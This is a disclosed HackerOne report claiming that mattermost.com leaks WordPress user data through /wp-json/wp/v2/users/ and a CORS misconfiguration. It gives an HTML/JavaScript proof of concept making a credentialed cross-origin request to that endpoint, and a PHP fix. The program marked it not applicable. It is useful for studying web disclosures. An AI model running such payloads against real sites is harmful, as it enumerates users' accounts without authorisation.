---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1113759'
original_report_id: '1113759'
title: '[mattermost.com] CORS Misconfiguration leakage of admin users'
weakness: Information Disclosure
team_handle: mattermost
created_at: '2021-03-01T12:21:27.381Z'
disclosed_at: '2021-03-19T08:28:33.655Z'
has_bounty: false
visibility: full
substate: not-applicable
vote_count: 4
asset_identifier: '*.mattermost.com'
asset_type: WILDCARD
max_severity: medium
tags:
- hackerone
- information-disclosure
---

# [mattermost.com] CORS Misconfiguration leakage of admin users

## Metadata

- HackerOne Report ID: 1113759
- Weakness: Information Disclosure
- Program: mattermost
- Disclosed At: 2021-03-19T08:28:33.655Z
- Has Bounty: No
- Visibility: full
- Substate: not-applicable

## Original Report

**Sumarry :**
CORS policies on pages containing sensitive information should be reviewed to determine whether it is appropriate for the application to trust both the intentions and security posture of any domains granted access.
It's possible to get information about the users registered (such as: id, name, login name, etc.) without authentication in Wordpress via API on
The vulnerability is registered as #772744 #356047 #591302 #138244 #329791

**Platform(s) Affected: [website]**
https://mattermost.com/wp-json/wp/v2/users/

**Proof On Concept:**
```javascript
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://mattermost.com/wp-json/wp/v2/users/", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```
  * Save as ``.html`` and Open and click Exploit on browsers

**Fix**
Use this code will hide the users list and give 404 as the result, while rest of the api calls keep running as they were.
```javascript
add_filter( 'rest_endpoints', function( $endpoints ){
    if ( isset( $endpoints['/wp/v2/users'] ) ) {
        unset( $endpoints['/wp/v2/users'] );
    }
    if ( isset( $endpoints['/wp/v2/users/(?P<id>[\d]+)'] ) ) {
        unset( $endpoints['/wp/v2/users/(?P<id>[\d]+)'] );
    }
    return $endpoints;
});
```

## Impact

Information disclosure in **``/wp-json/wp/v2/users/``**

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
